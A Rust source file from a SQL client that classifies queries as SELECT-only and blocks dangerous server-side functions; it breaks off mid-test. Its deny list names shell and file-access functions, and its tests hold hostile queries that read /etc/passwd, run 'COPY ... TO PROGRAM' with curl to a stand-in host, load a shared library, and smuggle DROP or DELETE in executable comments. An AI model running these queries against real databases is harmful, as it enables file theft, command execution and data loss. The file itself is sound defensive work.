//! SELECT-only classification and dangerous server-side artifact detection.
//!
//! Every verdict here is taken over every execution unit and every lexical
//! reading of it (see `statements`): a text is SELECT-only only when it is
//! SELECT-only however the destination engine could read it.

use super::statements::{Destination, UnitViews, keyword_sequences, statement_words, unit_views};
use super::statistics::is_statistics_sentinel;
use crate::query::tokenizer::TokenKind;
use sqlly_core::DatabaseType;
use sqlly_lang::seclex::View;

/// Byte range (into the original SQL) of the statement a classifier flagged, so
/// the editor can highlight the exact offending statement inline.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct BlockedSpan {
    pub start: usize,
    pub end: usize,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SafetyClassification {
    pub select_only: bool,
    pub reason: Option<String>,
    /// Span of the first statement that caused a block (when not select-only).
    pub blocked_span: Option<BlockedSpan>,
}

impl SafetyClassification {
    pub fn reason_message(&self) -> Option<sqlly_core::DisplayMessage> {
        let reason = self.reason.as_deref()?;
        let key = if reason == "empty query" {
            "services.safety.classify.empty"
        } else if reason.contains("is not a read-only command") {
            "services.safety.classify.redis_write"
        } else if reason.starts_with("statement cannot be classified safely:") {
            "services.safety.classify.ambiguous"
        } else if reason.starts_with("statement could not be classified as SELECT") {
            "services.safety.classify.not_select"
        } else if reason.starts_with("SET statement changes more") {
            "services.safety.classify.session_set"
        } else if reason.starts_with("statement contains mutating keyword") {
            "services.safety.classify.mutating_keyword"
        } else if reason.starts_with("statement starts with") {
            "services.safety.classify.not_select_start"
        } else if reason.starts_with("CTE statement does not contain SELECT") {
            "services.safety.classify.cte_no_select"
        } else if reason.starts_with("statement uses server-side artifact") {
            "services.safety.classify.server_artifact"
        } else {
            return Some(sqlly_core::DisplayMessage::raw(reason));
        };
        let mut message = sqlly_core::DisplayMessage::new(key, reason);
        if !matches!(
            key,
            "services.safety.classify.empty" | "services.safety.classify.redis_write"
        ) {
            let reading = reason
                .split(" (as ")
                .nth(1)
                .and_then(|tail| tail.strip_suffix(" reads it)"))
                .unwrap_or("primary");
            message = message.with_arg("reading", reading);
        }
        if let Some(keyword) = reason
            .split("statement contains mutating keyword ")
            .nth(1)
            .map(|tail| tail.split(' ').next().unwrap_or(tail))
        {
            message = message.with_arg("keyword", keyword);
        } else if let Some(keyword) = reason
            .split("statement starts with ")
            .nth(1)
            .map(|tail| tail.split(", not SELECT").next().unwrap_or(tail))
        {
            message = message.with_arg("keyword", keyword);
        } else if let Some(artifact) = reason.split("statement uses server-side artifact ").nth(1) {
            message = message.with_arg("artifact", artifact.split(' ').next().unwrap_or(artifact));
        } else if key == "services.safety.classify.redis_write" {
            if let Some((line, command)) = reason.split_once(": ") {
                message = message
                    .with_arg("line", line.trim_start_matches("line "))
                    .with_arg(
                        "command_name",
                        command.trim_end_matches(" is not a read-only command"),
                    );
            }
        } else if key == "services.safety.classify.ambiguous" {
            message = message.with_arg(
                "detail",
                reason.trim_start_matches("statement cannot be classified safely: "),
            );
        }
        Some(message)
    }

    fn blocked(reason: String, span: Option<BlockedSpan>) -> Self {
        SafetyClassification {
            select_only: false,
            reason: Some(reason),
            blocked_span: span,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum StatementKindHint {
    Select,
    Dml,
    Ddl,
    Other,
}

/// First keyword of the first statement, read for any engine.
pub fn statement_kind_hint(sql: &str) -> StatementKindHint {
    kind_hint(sql, Destination::Anywhere)
}

/// First keyword of the first statement, read as `db` reads it.
pub fn statement_kind_hint_for(db: DatabaseType, sql: &str) -> StatementKindHint {
    kind_hint(sql, Destination::Engine(db))
}

/// Whether any statement in `sql` (read as `db` reads it) creates, alters,
/// drops or renames an object, so the object explorer and IntelliSense
/// catalog are stale once it has run. `ALTER TABLE ... ADD COLUMN` counts;
/// GRANT/REVOKE and TRUNCATE leave the tree's shape alone and do not.
pub fn changes_schema_for(db: DatabaseType, sql: &str) -> bool {
    unit_views(sql, Destination::Engine(db)).iter().any(|u| {
        statement_words(u.views.primary())
            .into_iter()
            .filter(|s| !is_statistics_sentinel(&u.unit.text[s.start..s.end]))
            .any(|s| {
                let is_schema_verb = |k: &str| matches!(k, "CREATE" | "ALTER" | "DROP" | "RENAME");
                match s.words.first().map(String::as_str) {
                    Some(first) if is_schema_verb(first) => true,
                    // T-SQL control flow wraps DDL in one statement:
                    // `IF OBJECT_ID('t') IS NOT NULL DROP TABLE t`.
                    Some("IF" | "BEGIN" | "ELSE" | "WHILE") => {
                        s.keywords.iter().any(|k| is_schema_verb(k))
                    }
                    _ => false,
                }
            })
    })
}

fn kind_hint(sql: &str, dest: Destination) -> StatementKindHint {
    let units = unit_views(sql, dest);
    let first = units.first().and_then(|u| {
        keyword_sequences(u.views.primary())
            .into_iter()
            .find(|s| !is_statistics_sentinel(&u.unit.text[s.start..s.end]))
            .and_then(|s| s.keywords.first().cloned())
    });
    match first.as_deref() {
        Some("SELECT" | "WITH" | "SHOW" | "EXPLAIN") => StatementKindHint::Select,
        Some("CREATE" | "ALTER" | "DROP" | "RENAME" | "TRUNCATE" | "GRANT" | "REVOKE") => {
            StatementKindHint::Ddl
        }
        Some("INSERT" | "UPDATE" | "DELETE" | "MERGE" | "REPLACE") => StatementKindHint::Dml,
        _ => StatementKindHint::Other,
    }
}

/// SELECT-only classification when the destination engine is unknown: the
/// text must be SELECT-only under every modelled engine's reading.
pub fn classify_select_only(sql: &str) -> SafetyClassification {
    classify(sql, Destination::Anywhere)
}

/// SELECT-only classification for text bound for `db`: every execution unit
/// the driver would send, under every reading the engine could apply.
pub fn classify_select_only_for(db: DatabaseType, sql: &str) -> SafetyClassification {
    if db.is_command_engine() {
        return match super::redis::first_write_command(sql) {
            None if sql.trim().is_empty() => {
                SafetyClassification::blocked("empty query".to_string(), None)
            }
            None => SafetyClassification {
                select_only: true,
                reason: None,
                blocked_span: None,
            },
            Some((line, name)) => SafetyClassification::blocked(
                format!("line {line}: {name} is not a read-only command"),
                None,
            ),
        };
    }
    classify(sql, Destination::Engine(db))
}

pub(super) fn classify(sql: &str, dest: Destination) -> SafetyClassification {
    let units = unit_views(sql, dest);
    if units.is_empty() {
        return SafetyClassification::blocked("empty query".to_string(), None);
    }
    let mut saw_statement = false;
    for unit in &units {
        let whole = unit.map_span(0, unit.unit.text.len());
        let whole = Some(BlockedSpan {
            start: whole.0,
            end: whole.1,
        });
        if let Some(reason) = unit.views.ambiguity() {
            return SafetyClassification::blocked(
                format!("statement cannot be classified safely: {reason}"),
                whole,
            );
        }
        for view in &unit.views.views {
            match classify_view(unit, view) {
                ViewVerdict::Blocked(classification) => return classification,
                ViewVerdict::SelectOnly { statements } => saw_statement |= statements > 0,
            }
        }
    }
    if !saw_statement {
        return SafetyClassification::blocked("empty query".to_string(), None);
    }
    SafetyClassification {
        select_only: true,
        reason: None,
        blocked_span: None,
    }
}

enum ViewVerdict {
    SelectOnly { statements: usize },
    Blocked(SafetyClassification),
}

fn classify_view(unit: &UnitViews, view: &View) -> ViewVerdict {
    let text = &unit.unit.text;
    let reading = |reason: String| {
        if view.primary {
            reason
        } else {
            format!("{reason} (as {} reads it)", view.reading)
        }
    };
    let mut counted = 0usize;
    for statement in keyword_sequences(view) {
        let (start, end) = unit.map_span(statement.start, statement.end);
        let span = Some(BlockedSpan { start, end });
        // The Include Statistics sentinels the app adds around a run are
        // read-only session snapshots; recognized only as whole statements,
        // exactly as the engine bounds them.
        if is_statistics_sentinel(&text[statement.start..statement.end]) {
            continue;
        }
        counted += 1;
        let Some(first) = statement.keywords.first() else {
            return ViewVerdict::Blocked(SafetyClassification::blocked(
                reading("statement could not be classified as SELECT".to_string()),
                span,
            ));
        };
        // A session-scoped `SET` (`SET NOCOUNT ON`) changes how this session
        // reports or plans, never data: allowed when every option it sets is
        // on the safe list. Its own `SET` is the only mutating keyword it may
        // carry.
        if first == "SET" {
            let statement_text = &text[statement.start..statement.end];
            if !set_segments_are_session_scoped(statement_text) {
                return ViewVerdict::Blocked(SafetyClassification::blocked(
                    reading(
                        "SET statement changes more than this session's reporting and \
                         planning options"
                            .to_string(),
                    ),
                    span,
                ));
            }
            if let Some(keyword) = statement
                .keywords
                .iter()
                .find(|keyword| *keyword != "SET" && is_mutating_keyword(keyword))
            {
                return ViewVerdict::Blocked(SafetyClassification::blocked(
                    reading(format!("statement contains mutating keyword {keyword}")),
                    span,
                ));
            }
            continue;
        }
        // `USE <db>` is a session context switch, not a data change — allow it
        // under a SELECT-only policy (any real mutation after it is still
        // caught by the mutating-keyword scan below).
        if !matches!(first.as_str(), "SELECT" | "WITH" | "USE") {
            return ViewVerdict::Blocked(SafetyClassification::blocked(
                reading(format!("statement starts with {first}, not SELECT")),
                span,
            ));
        }
        if first == "WITH" && !statement.keywords.iter().any(|keyword| keyword == "SELECT") {
            return ViewVerdict::Blocked(SafetyClassification::blocked(
                reading("CTE statement does not contain SELECT".to_string()),
                span,
            ));
        }
        if let Some(keyword) = statement
            .keywords
            .iter()
            .find(|keyword| is_mutating_keyword(keyword))
        {
            return ViewVerdict::Blocked(SafetyClassification::blocked(
                reading(format!("statement contains mutating keyword {keyword}")),
                span,
            ));
        }
    }

    // Statements can be read-shaped and still reach the server's file system
    // or shell (OPENROWSET(BULK ...), pg_read_file(...), COPY ... TO
    // PROGRAM). A SELECT-only policy exists so a connection is safe to point
    // at production, so those artifacts are refused too.
    if let Some(artifact) = dangerous_artifact_in(view) {
        let (start, end) = unit.map_span(artifact.span.start, artifact.span.end);
        return ViewVerdict::Blocked(SafetyClassification::blocked(
            reading(format!(
                "statement uses server-side artifact {}",
                artifact.name
            )),
            Some(BlockedSpan { start, end }),
        ));
    }
    ViewVerdict::SelectOnly {
        statements: counted,
    }
}

/// Whether `sql` is exactly one statement for `db`: one execution unit, read
/// unambiguously, and a single `;`-delimited statement under every lexical
/// reading. T-SQL runs statements without separators, so on SQL Server this
/// cannot rule out a second verb — pair it with a SELECT-only or compile-only
/// execution when that matters.
pub fn is_single_statement_for(db: DatabaseType, sql: &str) -> bool {
    let units = unit_views(sql, Destination::Engine(db));
    units.len() == 1
        && units.iter().all(|u| {
            u.views.ambiguity().is_none()
                && u.views
                    .views
                    .iter()
                    .all(|view| keyword_sequences(view).len() == 1)
        })
}

/// A statement or function that reads/writes the SERVER's file system, runs
/// programs server-side, or loads code — flagged by [`find_dangerous_artifact`]
/// even when the statement is otherwise read-shaped.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DangerousArtifact {
    /// Uppercase name of the artifact, for the refusal message.
    pub name: String,
    /// Span of the artifact token itself, so the editor can highlight it.
    pub span: BlockedSpan,
}

/// Functions/procedures with server-side file, shell, or code-loading effects,
/// matched wherever they appear as an identifier.
const DANGEROUS_FUNCTIONS: &[&str] = &[
    // SQL Server
    "XP_CMDSHELL",
    "SP_CONFIGURE",
    "SP_OACREATE",
    "SP_OAMETHOD",
    "OPENROWSET",
    "OPENDATASOURCE",
    // MySQL / MariaDB
    "LOAD_FILE",
    "OUTFILE",
    "DUMPFILE",
    // PostgreSQL
    "PG_READ_FILE",
    "PG_READ_BINARY_FILE",
    "PG_LS_DIR",
    "LO_IMPORT",
    "LO_EXPORT",
    // SQLite
    "LOAD_EXTENSION",
    "READFILE",
    "WRITEFILE",
];

/// Statement-leading words with server-side effects that the keyword-sequence
/// scan cannot see (they lex as identifiers, so a `COPY (SELECT 1) TO PROGRAM
/// 'cmd'` batch otherwise looks like it "starts with SELECT").
const DANGEROUS_LEADS: &[&str] = &[
    "COPY",      // PostgreSQL: server-side file/program I/O (and table loads)
    "LOAD",      // MySQL: LOAD DATA / LOAD XML
    "ATTACH",    // SQLite: attaches a writable database file
    "DETACH",    // SQLite
    "INSTALL",   // MySQL plugin loading
    "UNINSTALL", // MySQL
    "CALL",      // MySQL/PostgreSQL procedure execution (EXEC's counterpart)
    "DO",        // PostgreSQL anonymous code block / MySQL expression exec
];

/// The first dangerous server-side artifact in the batch under any engine's
/// reading: a [`DANGEROUS_FUNCTIONS`] identifier anywhere, or a
/// [`DANGEROUS_LEADS`] word leading a statement. Names inside string literals
/// and comments are inert; executable MySQL/MariaDB comment payloads are live
/// code in the readings that run them; quoted/bracketed spellings are
/// normalized before matching, so `[xp_cmdshell]` and `"OPENROWSET"` are
/// still caught.
pub fn find_dangerous_artifact(sql: &str) -> Option<DangerousArtifact> {
    dangerous_artifact(sql, Destination::Anywhere)
}

/// [`find_dangerous_artifact`] for text bound for `db`.
pub fn find_dangerous_artifact_for(db: DatabaseType, sql: &str) -> Option<DangerousArtifact> {
    dangerous_artifact(sql, Destination::Engine(db))
}

fn dangerous_artifact(sql: &str, dest: Destination) -> Option<DangerousArtifact> {
    for unit in unit_views(sql, dest) {
        for view in &unit.views.views {
            if let Some(mut artifact) = dangerous_artifact_in(view) {
                let (start, end) = unit.map_span(artifact.span.start, artifact.span.end);
                artifact.span = BlockedSpan { start, end };
                return Some(artifact);
            }
        }
    }
    None
}

fn dangerous_artifact_in(view: &View) -> Option<DangerousArtifact> {
    let mut at_statement_start = true;
    for token in view.tokens() {
        match token.kind {
            TokenKind::Comment | TokenKind::Whitespace => continue,
            TokenKind::Identifier | TokenKind::Keyword => {
                let name = normalize_artifact_name(token.text);
                let lead_hit = at_statement_start && DANGEROUS_LEADS.contains(&name.as_str());
                if lead_hit || DANGEROUS_FUNCTIONS.contains(&name.as_str()) {
                    return Some(DangerousArtifact {
                        name,
                        span: BlockedSpan {
                            start: token.start,
                            end: token.end,
                        },
                    });
                }
                at_statement_start = false;
            }
            TokenKind::Symbol if token.text == ";" => at_statement_start = true,
            _ => at_statement_start = false,
        }
    }
    None
}

/// Uppercase an identifier token with any quoting stripped (`[x]`, `"x"`,
/// `` `x` ``) so quoted spellings of a dangerous name still match.
fn normalize_artifact_name(text: &str) -> String {
    text.trim_matches(|c| matches!(c, '[' | ']' | '"' | '`'))
        .to_ascii_uppercase()
}

/// Session options a SELECT-only connection may set: they change what the
/// session reports, how it plans, waits, or formats dates — never data, and
/// never how later SQL is lexed. Settings that do change lexing (MySQL
/// `sql_mode`, `NAMES` / character sets, PostgreSQL
/// `standard_conforming_strings`, T-SQL `QUOTED_IDENTIFIER`) stay refused:
/// they could make the server read a later statement differently from the
/// classifier.
const SESSION_SET_OPTIONS: &[&str] = &[
    // SQL Server
    "nocount",
    "xact_abort",
    "ansi_nulls",
    "ansi_padding",
    "ansi_warnings",
    "ansi_null_dflt_on",
    "ansi_null_dflt_off",
    "arithabort",
    "arithignore",
    "concat_null_yields_null",
    "numeric_roundabort",
    "datefirst",
    "dateformat",
    "language",
    "lock_timeout",
    "deadlock_priority",
    "rowcount",
    "textsize",
    "query_governor_cost_limit",
    "fmtonly",
    "noexec",
    "parseonly",
    "forceplan",
    "no_browsetable",
    "statistics",
    "showplan_all",
    "showplan_text",
    "showplan_xml",
    "transaction",
    // PostgreSQL
    "statement_timeout",
    "idle_in_transaction_session_timeout",
    "search_path",
    "timezone",
    "time",
    "datestyle",
    "intervalstyle",
    "extra_float_digits",
    "work_mem",
    "random_page_cost",
    "seq_page_cost",
    "effective_cache_size",
    "jit",
    "application_name",
    "max_parallel_workers_per_gather",
    "constraints",
    // MySQL / MariaDB
    "max_execution_time",
    "max_statement_time",
    "time_zone",
    "lock_wait_timeout",
    "innodb_lock_wait_timeout",
    "group_concat_max_len",
    "sql_select_limit",
    "max_join_size",
    "optimizer_switch",
    "cte_max_recursion_depth",
    "profiling",
    "net_read_timeout",
    "net_write_timeout",
];

/// Words that begin the next statement when T-SQL runs several without `;`
/// (`SET NOCOUNT ON⏎SELECT …`).
const NEXT_STATEMENT_WORDS: &[&str] = &[
    "set", "select", "with", "use", "insert", "update", "delete", "merge", "exec", "execute",
    "declare", "if", "while", "begin", "create", "alter", "drop", "truncate", "grant", "deny",
    "revoke", "print", "return", "waitfor",
];

/// Split `statement` at each [`NEXT_STATEMENT_WORDS`] word outside quotes
/// and parentheses, and require every `SET` segment to be session-scoped.
/// The other segments are judged by the caller's mutating-keyword scan.
fn set_segments_are_session_scoped(statement: &str) -> bool {
    let lower = statement.to_ascii_lowercase();
    let bytes = lower.as_bytes();
    let mut starts = Vec::new();
    let (mut i, mut depth) = (0usize, 0i32);
    while i < bytes.len() {
        match bytes[i] {
            q @ (b'\'' | b'"' | b'`' | b'[') => {
                let close = if q == b'[' { b']' } else { q };
                i += 1;
                while i < bytes.len() && bytes[i] != close {
                    i += 1;
                }
                i += 1;
            }
            b'(' => {
                depth += 1;
                i += 1;
            }
            b')' => {
                depth -= 1;
                i += 1;
            }
            b if b.is_ascii_alphanumeric() || b == b'_' || b == b'@' => {
                let start = i;
                while i < bytes.len()
                    && (bytes[i].is_ascii_alphanumeric() || matches!(bytes[i], b'_' | b'@' | b'.'))
                {
                    i += 1;
                }
                if depth == 0 && NEXT_STATEMENT_WORDS.contains(&&lower[start..i]) {
                    starts.push(start);
                }
            }
            _ => i += 1,
        }
    }
    starts.push(lower.len());
    starts.windows(2).all(|pair| {
        let segment = &statement[pair[0]..pair[1]];
        !segment[..3.min(segment.len())].eq_ignore_ascii_case("set")
            || is_session_scoped_set(segment)
    })
}

/// True when `statement` (one whole `SET …` statement) only sets
/// session-scoped options from [`SESSION_SET_OPTIONS`], user variables
/// (`SET @x = …`), or a transaction's isolation level — never GLOBAL or
/// PERSIST scope and never READ WRITE. Anything unrecognized is refused.
fn is_session_scoped_set(statement: &str) -> bool {
    let lower = statement.to_ascii_lowercase();
    if lower.contains("--") || lower.contains("/*") || lower.contains('#') {
        return false; // interior comments: fail closed
    }
    let Some(rest) = lower.trim().strip_prefix("set") else {
        return false;
    };
    let rest = rest.trim_start();
    let rest = ["session ", "local "]
        .iter()
        .find_map(|scope| rest.strip_prefix(scope))
        .unwrap_or(rest)
        .trim_start();
    let words: Vec<&str> = rest
        .split(|c: char| !(c.is_ascii_alphanumeric() || matches!(c, '_' | '@' | '.')))
        .filter(|w| !w.is_empty())
        .collect();
    if words.contains(&"write") {
        return false; // `READ WRITE` would lift a read-only transaction
    }
    let assigns = rest.contains('=') || words.get(1) == Some(&"to");
    let items = split_top_level_commas(rest);
    let mut first = true;
    for item in items {
        let item = item.trim();
        // After `name = value`, a comma item without its own `=` is part of
        // the value list (`search_path = a, b`).
        if !first && assigns && !item.contains('=') {
            continue;
        }
        first = false;
        let name = item
            .split(|c: char| c.is_ascii_whitespace() || c == '=')
            .find(|w| !w.is_empty())
            .unwrap_or("");
        if !is_session_set_name(name) {
            return false;
        }
    }
    true
}

fn is_session_set_name(name: &str) -> bool {
    if let Some(system) = name.strip_prefix("@@") {
        let Some(var) = system
            .strip_prefix("session.")
            .or_else(|| (!system.contains('.')).then_some(system))
        else {
            return false; // @@global., @@persist., @@persist_only.
        };
        return SESSION_SET_OPTIONS.contains(&var);
    }
    if name.starts_with('@') {
        return name.len() > 1; // a user / local variable
    }
    let name = name.strip_prefix("session.").unwrap_or(name);
    SESSION_SET_OPTIONS.contains(&name) || name.starts_with("enable_")
}

fn split_top_level_commas(text: &str) -> Vec<&str> {
    let mut items = Vec::new();
    let (mut depth, mut quote, mut start) = (0i32, None::<char>, 0usize);
    for (i, c) in text.char_indices() {
        match (quote, c) {
            (Some(q), c) if c == q => quote = None,
            (Some(_), _) => {}
            (None, '\'' | '"' | '`') => quote = Some(c),
            (None, '(') => depth += 1,
            (None, ')') => depth -= 1,
            (None, ',') if depth == 0 => {
                items.push(&text[start..i]);
                start = i + 1;
            }
            _ => {}
        }
    }
    items.push(&text[start..]);
    items
}

fn is_mutating_keyword(keyword: &str) -> bool {
    matches!(
        keyword,
        "ALTER"
            | "BACKUP"
            | "BEGIN"
            | "COMMIT"
            | "CREATE"
            | "DBCC"
            | "DECLARE"
            | "DELETE"
            | "DENY"
            | "DROP"
            | "EXEC"
            | "EXECUTE"
            | "GRANT"
            | "INSERT"
            | "INTO"
            | "MERGE"
            | "RESTORE"
            | "REVOKE"
            | "ROLLBACK"
            | "SET"
            | "TRUNCATE"
            | "UPDATE"
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn read_shaped_server_side_artifacts_are_blocked() {
        // These all previously PASSED the SELECT-only gate: read-shaped
        // statements that reach the server's file system or shell.
        for sql in [
            "SELECT * FROM OPENROWSET(BULK 'C:\\payroll.csv', SINGLE_CLOB) AS t",
            "SELECT pg_read_file('/etc/passwd')",
            "SELECT pg_ls_dir('/var/lib')",
            "COPY (SELECT 1) TO PROGRAM 'curl evil.example'",
            "SELECT load_file('/etc/passwd')",
            "SELECT lo_export(1234, '/tmp/out')",
            "SELECT load_extension('/tmp/evil.so')",
            "SELECT 1; CALL sneaky_proc((SELECT 2))",
            "ATTACH DATABASE '/tmp/other.db' AS other",
            "DO $$ BEGIN PERFORM 1; END $$",
        ] {
            let c = classify_select_only(sql);
            assert!(!c.select_only, "must block: {sql}");
            assert!(c.blocked_span.is_some(), "span expected: {sql}");
        }
        // Quoted/bracketed spellings still match.
        let c = classify_select_only("SELECT * FROM [OPENROWSET](BULK 'x', SINGLE_CLOB) AS t");
        assert!(!c.select_only);
    }

    /// DBeaver #42337: a window frame with UNBOUNDED PRECEDING silently
    /// stopped running there. Here it stays one statement, reads as a plain
    /// SELECT and passes the read-only gate on every engine family.
    #[test]
    fn window_frames_run_as_one_read_only_select() {
        let sql = "SELECT id,\n       SUM(x) OVER (ORDER BY id ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW) AS running,\n       AVG(x) OVER (PARTITION BY id ROWS UNBOUNDED PRECEDING) AS avg_x\nFROM t;";
        for db in [
            DatabaseType::SqlServer,
            DatabaseType::Postgres,
            DatabaseType::MySql,
            DatabaseType::MariaDb,
            DatabaseType::Sqlite,
            DatabaseType::Oracle,
            DatabaseType::DuckDb,
            DatabaseType::ClickHouse,
        ] {
            assert_eq!(
                statement_kind_hint_for(db, sql),
                StatementKindHint::Select,
                "{db:?}"
            );
            let c = classify_select_only_for(db, sql);
            assert!(c.select_only, "{db:?}: {:?}", c.reason);
        }
    }

    #[test]
    fn artifact_names_in_strings_comments_and_columns_stay_inert() {
        for sql in [
            "SELECT 'xp_cmdshell openrowset pg_read_file' AS doc",
            "SELECT 1 -- try OPENROWSET here\n",
            "SELECT 1 /* COPY TO PROGRAM */",
            // Exact-match only: similar names are not artifacts.
            "SELECT openrowset_audit_count FROM stats",
            // Not statement-leading: a table merely named like a lead word.
            "SELECT * FROM copy",
        ] {
            let c = classify_select_only(sql);
            assert!(
                c.select_only,
                "must stay select-only: {sql} ({:?})",
                c.reason
            );
        }
    }

    #[test]
    fn executable_comment_cannot_smuggle_an_artifact() {
        let c = classify_select_only("SELECT 1 /*!50000 , load_file('/etc/passwd') */");
        assert!(!c.select_only);
        let reason = c.reason.unwrap();
        assert!(reason.contains("LOAD_FILE"), "{reason}");
    }

    #[test]
    fn select_classifier_allows_select_batches_and_comments() {
        let result =
            classify_select_only("-- ok\nSELECT 1; /* still ok */ SELECT name FROM sys.databases");
        assert!(result.select_only, "{:?}", result.reason);
    }

    #[test]
    fn select_classifier_allows_cte_select() {
        let result = classify_select_only("WITH cte AS (SELECT 1 AS id) SELECT id FROM cte");
        assert!(result.select_only, "{:?}", result.reason);
    }

    #[test]
    fn select_classifier_blocks_bare_procedure_invocation() {
        let result = classify_select_only("SELECT 1; dbo.PurgeAllRows");
        assert!(!result.select_only);
        assert!(result.blocked_span.is_some());
    }

    #[test]
    fn select_classifier_blocks_keywordless_trailing_statement() {
        let trailing = classify_select_only("SELECT 1; foo 42");
        assert!(!trailing.select_only);
        assert!(trailing.blocked_span.is_some());

        let leading = classify_select_only("foo 42; SELECT 1");
        assert!(!leading.select_only);
        assert!(leading.blocked_span.is_some());
    }

    #[test]
    fn select_classifier_still_allows_pure_selects() {
        let result =
            classify_select_only("-- ok\nSELECT 1; /* still ok */ SELECT name FROM sys.databases");
        assert!(result.select_only, "{:?}", result.reason);
    }

    #[test]
    fn empty_and_semicolon_only_batches_stay_empty() {
        let result = classify_select_only(";;");
        assert!(!result.select_only);
        assert_eq!(result.reason.as_deref(), Some("empty query"));
    }

    #[test]
    fn select_classifier_still_blocks_keywordless_and_exec() {
        assert!(!classify_select_only("foo 42").select_only);
        assert!(!classify_select_only("EXEC dbo.P").select_only);
    }

    #[test]
    fn select_classifier_rejects_mutation_and_select_into() {
        let update = classify_select_only("SELECT 1; UPDATE dbo.t SET a = 1");
        assert!(!update.select_only);
        assert!(update.reason.unwrap().contains("UPDATE"));

        let select_into = classify_select_only("SELECT * INTO dbo.copy FROM dbo.source");
        assert!(!select_into.select_only);
        assert!(select_into.reason.unwrap().contains("INTO"));
    }

    #[test]
    fn classifier_reports_blocked_statement_span() {
        let sql = "SELECT 1; UPDATE dbo.t SET a = 1";
        let result = classify_select_only(sql);
        assert!(!result.select_only);
        let span = result.blocked_span.expect("a span is reported");
        // The flagged statement is the UPDATE; its span should cover it.
        let flagged = &sql[span.start..span.end];
        assert!(flagged.contains("UPDATE"), "flagged: {flagged:?}");
        assert!(!flagged.contains("SELECT 1"), "flagged: {flagged:?}");
    }

    #[test]
    fn executable_mysql_comments_cannot_hide_mutations() {
        // MySQL executes `/*!...*/` payloads (MariaDB adds `/*M!...*/`), so a
        // mutation smuggled inside one must block a SELECT-only policy even
        // though the tokenizer reports the whole construct as a comment.
        for sql in [
            "/*!50003 DELETE FROM t */ SELECT 1",
            "/*!50003 DROP TABLE t */ SELECT 1",
            "/*! UPDATE t SET x = 1 */ SELECT 1",
            "/*M!100100 DELETE FROM t */ SELECT 1",
            "SELECT 1; /*!50003 TRUNCATE TABLE t */",
            // Unterminated executable comment at EOF: fail closed.
            "/*!50003 DROP TABLE t",
        ] {
            let result = classify_select_only(sql);
            assert!(!result.select_only, "{sql}: {result:?}");
        }

        // The blocked span stays valid against the user's original source.
        let sql = "/*!50003 DROP TABLE t */ SELECT 1";
        let result = classify_select_only(sql);
        let span = result.blocked_span.expect("a span is reported");
        assert!(
            sql[span.start..span.end].contains("DROP"),
            "span {span:?} -> {:?}",
            &sql[span.start..span.end]
        );
    }

    #[test]
    fn ordinary_comments_and_literal_lookalikes_stay_invisible() {
        // Non-executable comments keep their existing behavior, and
        // executable-comment text inside a string literal is data, not SQL —
        // detection walks tokenizer comment tokens, never raw substrings.
        for sql in [
            "/* DELETE FROM t */ SELECT 1",
            "/*+ MAX_EXECUTION_TIME(1000) */ SELECT 1",
            "SELECT '/*!50003 DELETE FROM t */'",
            "-- DELETE FROM t\nSELECT 1",
        ] {
            let result = classify_select_only(sql);
            assert!(result.select_only, "{sql}: {:?}", result.reason);
        }
    }

    /// Vendor-construct corpus beyond executable comments: client directives
    /// and mode switches that change statement meaning per engine must either
    /// fail closed or be provably inert under the conservative invariant
    /// classification.
    #[test]
    fn vendor_directives_fail_closed_or_stay_inert() {
        // MySQL DELIMITER scripts: the custom delimiter is an ordinary
        // identifier to the invariant tokenizer, so it can never hide the
        // verbs that follow it.
        let hidden = classify_select_only("DELIMITER //\nDROP TABLE t//\nDELIMITER ;");
        assert!(!hidden.select_only, "{hidden:?}");
        let benign = classify_select_only("DELIMITER //\nSELECT 1//\nDELIMITER ;");
        assert!(benign.select_only, "{:?}", benign.reason);

        // SQL-mode directives are session mutations (`SET` is a mutating
        // keyword), so ANSI_QUOTES can never be switched on under a
        // SELECT-only policy to re-purpose double quotes downstream.
        let mode = classify_select_only("SET sql_mode = 'ANSI_QUOTES'; SELECT \"x\" FROM t");
        assert!(!mode.select_only, "{mode:?}");

        // Double quotes are a quote on every engine — a string on MySQL, an
        // identifier elsewhere — so the word inside is never a verb. (The old
        // dialect-free tokenizer had no double-quote rule at all, which is
        // what let a quote character inside `"'"` open a fake literal.)
        let quoted = classify_select_only("SELECT \"DELETE\" FROM t");
        assert!(quoted.select_only, "{quoted:?}");

        // MySQL's no-space `--` quirk (`SELECT 1 --2` is arithmetic there, a
        // comment to us) cannot smuggle a statement: the only inputs MySQL
        // executes in that position are expressions, so the conservative
        // comment treatment stays select-only and safe.
        let dashes = classify_select_only("SELECT 1 --2");
        assert!(dashes.select_only, "{:?}", dashes.reason);
    }

    /// ADR-016 (as amended 2026-09-28): the dialect-free entry point judges
    /// text under every modelled engine at once, so it stays invariant and is
    /// a superset of what any engine would run. The expectations below pin
    /// that conservative union for dialect-flavored input; the engine-aware
    /// `classify_select_only_for` relaxes exactly the cases the connected
    /// engine reads as inert (see `bypass_tests`).
    #[test]
    fn classification_is_dialect_invariant() {
        // MySQL would treat `# ...` as a comment; we conservatively do NOT,
        // so the DELETE still blocks a SELECT-only profile on every backend.
        let hash = classify_select_only("# note\nDELETE FROM t");
        assert!(!hash.select_only, "{hash:?}");

        // Postgres would treat $$...$$ as a string; we conservatively see the
        // UPDATE inside it, so it blocks identically on every backend.
        let dollar = classify_select_only("SELECT f($$ UPDATE t SET x = 1 $$)");
        assert!(!dollar.select_only, "{dollar:?}");

        // T-SQL temp tables stay plain identifiers — a pure SELECT against
        // #temp is select-only on every backend.
        let temp = classify_select_only("SELECT x FROM #temp");
        assert!(temp.select_only, "{temp:?}");

        // Backtick quoting never hides keywords: MySQL/SQLite would read
        // `` `DELETE` `` as a quoted identifier, but the invariant tokenizer
        // has no backtick rule, so the word inside stays a visible keyword and
        // conservatively blocks. (Ordinary backticked names still pass.)
        let tick = classify_select_only("SELECT `DELETE` FROM t");
        assert!(!tick.select_only, "{tick:?}");
        let plain_tick = classify_select_only("SELECT `a` FROM t");
        assert!(plain_tick.select_only, "{plain_tick:?}");

        // MySQL executes `/*!...*/` comment payloads; we conservatively expose
        // them on every backend, so the hidden DROP blocks identically no
        // matter which database the profile points at.
        let executable = classify_select_only("/*!50003 DROP TABLE t */ SELECT 1");
        assert!(!executable.select_only, "{executable:?}");
    }

    #[test]
